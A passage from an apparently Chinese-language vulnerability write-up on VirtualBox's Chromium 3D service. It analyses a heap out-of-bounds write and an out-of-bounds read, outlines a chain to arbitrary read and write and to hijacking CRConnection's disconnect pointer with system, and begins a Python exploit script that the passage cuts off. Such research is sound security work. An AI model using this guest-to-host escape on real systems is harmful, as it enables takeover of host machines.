+        &lt;span class=&quot;n&quot;&gt;jUpTo&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;count&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;?&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pLocalLength&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pLocalLength&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;j&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;j&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;jUpTo&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;j&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+        &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+            &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pString&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ppStrings&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
+&lt;span class=&quot;err&quot;&gt;​&lt;/span&gt;
+            &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pString&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;j&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;sc&quot;&gt;&#39;\0&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+            &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+                &lt;span class=&quot;n&quot;&gt;Assert&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;j&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;jUpTo&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+                &lt;span class=&quot;n&quot;&gt;pString&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;j&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;sc&quot;&gt;&#39;\n&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+            &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;span class=&quot;err&quot;&gt;​&lt;/span&gt;
+&lt;span class=&quot;c1&quot;&gt;//    cr_unpackDispatch.ShaderSource(shader, count, ppStrings, length ? length : pLocalLength);&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;cr_unpackDispatch&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ShaderSource&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;shader&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ppStrings&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+&lt;span class=&quot;err&quot;&gt;​&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;crFree&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ppStrings&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;    仔细看会发现在中间一段for循环检查pLocalLength数组的每个元素跟所有元素的和的大小是否越界时，并未检查最后一层循环过后pos_check是否越界，据此我们可以在最后的两层嵌套循环中的内层中实现越界写，而这个越界写也很有趣：&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-c&quot;&gt;&lt;span&gt;&lt;/span&gt;        &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;j&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;j&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;jUpTo&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;j&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+        &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+            &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pString&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ppStrings&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
+&lt;span class=&quot;err&quot;&gt;​&lt;/span&gt;
+            &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pString&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;j&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;sc&quot;&gt;&#39;\0&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+            &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+                &lt;span class=&quot;n&quot;&gt;Assert&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;j&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;jUpTo&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+                &lt;span class=&quot;n&quot;&gt;pString&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;j&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;sc&quot;&gt;&#39;\n&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+            &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;    它可以将越界部分所有的&#39;\0&#39;替换为&#39;\n&#39;。通过这个漏洞我们可以越界写一块堆内存，将其后面内存中若干的&#39;\0&#39;替换为&#39;\n&#39;。（注意：Assert在release版中是不存在的！）之后我们会介绍如何通过这个越界写实现任意地址写。&lt;/p&gt;&lt;p&gt;    当然只有一个越界写可能利用起来还是十分困难，我们仔细看了看niklasb写的文章，发现在很多类似的unpack函数中均存在类似于CVE-2018-3055的漏洞，比如crUnpackExtendGetUniformLocation：&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-c&quot;&gt;&lt;span&gt;&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;crUnpackExtendGetUniformLocation&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+    &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;packet_length&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;READ_DATA&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;GLuint&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;program&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;READ_DATA&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;GLuint&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;name&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;DATA_POINTER&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;12&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;SET_RETURN_PTR&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;packet_length&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;SET_WRITEBACK_PTR&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;packet_length&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;cr_unpackDispatch&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;GetUniformLocation&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;program&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;    漏洞的成因完全与CVE-2018-3055相同，简单来说SET_RETURN_PTR和SET_WRITEBACK_PTR指向的内存会写回到guest，而这里因为没有对packet_length做对应的检查导致我们可以在堆上实现越界读。&lt;/p&gt;&lt;h2&gt;&lt;b&gt;漏洞利用&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;    通过以上的代码分析，我们现在有一个堆越界读和一个堆越界写，接下来我们来分析如何去完成完整的漏洞利用。&lt;/p&gt;&lt;p&gt;    因为信息泄露部分完全与CVE-2018-3055基本相同，我们选择直接复用niklasb之前的exp leak部分的代码。重写make_oob_read后通过leak_stuff我们可以泄露一个CRConnection结构体的位置，而niklasb的exp中就是通过修改pHostBuffer和cbHostBuffer来实现任意地址读。因此，当我们有任意地址写的条件之后我们就可以任意地址读了。&lt;/p&gt;&lt;p&gt;    接下来的关键就是如何用我们神奇的堆溢出来实现任意地址写了。@kelwin找到了一个很好用的结构体CRVBOXSVCBUFFER_t，也就是niklasb的代码中alloc_buf使用的结构体：&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-c&quot;&gt;&lt;span&gt;&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;typedef&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_CRVBOXSVCBUFFER_t&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+    &lt;span class=&quot;kt&quot;&gt;uint32_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;uiId&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;kt&quot;&gt;uint32_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;uiSize&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;pData&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;_CRVBOXSVCBUFFER_t&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pNext&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pPrev&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;CRVBOXSVCBUFFER_t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;    如果可以在堆上我们可以越界写的内存后面恰好布置这样一个结构体，越界写它对应的uiSize部分，再通过SHCRGL_GUEST_FN_WRITE_BUFFER就可以越界写这个buffer所对应的pData的内容，之后再越界写另一个相同的结构体，就可以实现任意地址写了。实现任意地址写的具体过程如下：&lt;/p&gt;&lt;p&gt;1.n次调用alloc_buf，对应的buffer填充为可以触发越界写的部分，从而确保在我们可以越界写的堆后有可用的CRVBOXSVCBUFFER_t结构体。此时内存分布如下：&lt;/p&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-734d5f102595b96f81d280832ca980cf_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1028&quot; data-rawheight=&quot;742&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;1028&quot; data-original=&quot;https://pic4.zhimg.com/v2-734d5f102595b96f81d280832ca980cf_r.jpg&quot;&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-734d5f102595b96f81d280832ca980cf_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1028&quot; data-rawheight=&quot;742&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;1028&quot; data-original=&quot;https://pic4.zhimg.com/v2-734d5f102595b96f81d280832ca980cf_r.jpg&quot; data-actualsrc=&quot;https://pic4.zhimg.com/v2-734d5f102595b96f81d280832ca980cf_b.jpg&quot;&gt;&lt;/figure&gt;&lt;p&gt;2.通过SHCRGL_GUEST_FN_WRITE_READ使用第n-3个buffer，触发堆越界写，覆盖掉第n-2个buffer的size部分。此时内存分布如下：&lt;/p&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-d44646dfcd843d562b806fb8afb6faa7_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1014&quot; data-rawheight=&quot;742&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;1014&quot; data-original=&quot;https://pic4.zhimg.com/v2-d44646dfcd843d562b806fb8afb6faa7_r.jpg&quot;&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-d44646dfcd843d562b806fb8afb6faa7_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1014&quot; data-rawheight=&quot;742&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;1014&quot; data-original=&quot;https://pic4.zhimg.com/v2-d44646dfcd843d562b806fb8afb6faa7_r.jpg&quot; data-actualsrc=&quot;https://pic4.zhimg.com/v2-d44646dfcd843d562b806fb8afb6faa7_b.jpg&quot;&gt;&lt;/figure&gt;&lt;p&gt;3.通过SHCRGL_GUEST_FN_WRITE使用第n-2个buffer，触发堆越界写，可以修改第n-1个buffer的uiSize和pData为任意值。此时内存分布如下：&lt;/p&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-70051b611de89a259054b033c1bd8d38_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1110&quot; data-rawheight=&quot;738&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;1110&quot; data-original=&quot;https://pic1.zhimg.com/v2-70051b611de89a259054b033c1bd8d38_r.jpg&quot;&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-70051b611de89a259054b033c1bd8d38_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1110&quot; data-rawheight=&quot;738&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;1110&quot; data-original=&quot;https://pic1.zhimg.com/v2-70051b611de89a259054b033c1bd8d38_r.jpg&quot; data-actualsrc=&quot;https://pic1.zhimg.com/v2-70051b611de89a259054b033c1bd8d38_b.jpg&quot;&gt;&lt;/figure&gt;&lt;p&gt;4.通过SHCRGL_GUEST_FN_WRITE使用第n-1个buffer，触发任意地址写，写的地址与长度由步骤3控制&lt;/p&gt;&lt;p&gt;5.多次任意地址写可以通过多次反复SHCRGL_GUEST_FN_WRITE第n-2个buffer和第n-1个buffer实现&lt;/p&gt;&lt;p&gt;    在有了任意读和任意写的能力之后，我们可以修改某个CRConnection结构体中disconnect函数指针来劫持rip，通过修改CRConnection头部的数据可以控制对应的参数。所以漏洞利用的完整过程如下：&lt;/p&gt;&lt;ol&gt;&lt;li&gt;通过越界读泄露一个CRConnection结构体的位置&lt;/li&gt;&lt;li&gt;配置内存实现任意地址写&lt;/li&gt;&lt;li&gt;通过任意地址读泄露CRConnection结构体中alloc函数对应地址&lt;/li&gt;&lt;li&gt;通过alloc函数地址计算VBoxOGLhostcrutil.so库地址，最终泄露libc地址&lt;/li&gt;&lt;li&gt;修改CRConnection的disconnect函数指针为system&lt;/li&gt;&lt;li&gt;修改CRConnection的头部为payload&lt;/li&gt;&lt;li&gt;disconnect对应的client&lt;/li&gt;&lt;/ol&gt;&lt;p&gt;完整exp：&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;&lt;span&gt;&lt;/span&gt;&lt;span class=&quot;ch&quot;&gt;#!/usr/bin/env python2&lt;/span&gt;
+&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;__future__&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;print_function&lt;/span&gt;
+&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;os&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;sys&lt;/span&gt;
+&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;array&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;array&lt;/span&gt;
+&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pack&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;unpack&lt;/span&gt;
+&lt;span class=&quot;err&quot;&gt;​&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;sys&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;path&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;append&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;os&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;path&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;abspath&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;os&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;path&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;dirname&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;vm&quot;&gt;__file__&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&#39;/lib&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;chromium&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;
+&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;hgcm&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;
+&lt;span class=&quot;err&quot;&gt;​&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;make_oob_read&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;offset&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;pack&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&amp;lt;III&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;CR_MESSAGE_OPCODES&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x41414141&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+        &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\0\0\0&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&#39;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;chr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;CR_EXTEND_OPCODE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+        &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pack&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&amp;lt;I&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;offset&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+        &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pack&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&amp;lt;I&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;CR_GETUNIFORMLOCATION_EXTEND_OPCODE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+        &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pack&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&amp;lt;I&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+        &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&#39;LEET&#39;&lt;/span&gt;
+        &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;err&quot;&gt;​&lt;/span&gt;
